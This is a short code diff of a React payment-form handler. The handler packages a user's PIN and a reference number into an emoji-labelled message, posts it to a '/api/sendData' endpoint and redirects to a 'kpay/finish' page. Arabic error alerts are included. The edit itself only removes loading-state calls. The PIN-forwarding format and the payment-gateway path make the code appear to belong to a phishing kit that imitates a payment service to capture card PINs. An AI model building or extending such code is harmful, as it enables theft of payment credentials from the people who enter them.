@@ -33,7 +33,7 @@ const handleSubmit = async () => {
 const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
     
   try {
-    setIsProcessing(true);
+    
     const res = await fetch("/api/sendData", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -41,7 +41,7 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
     });
 
     const result = await res.json();
-    setIsProcessing(false);
+    
 
     if (result.success) {
       router.push(`/kpay/finish?refN=${refN}&price=${price}`);
@@ -49,7 +49,7 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
       alert("حدث خطأ: " + result.error);
     }
   } catch (err) {
-    setIsProcessing(false);
+    
     console.error(err);
     alert("حدث خطأ أثناء الإرسال");
   }
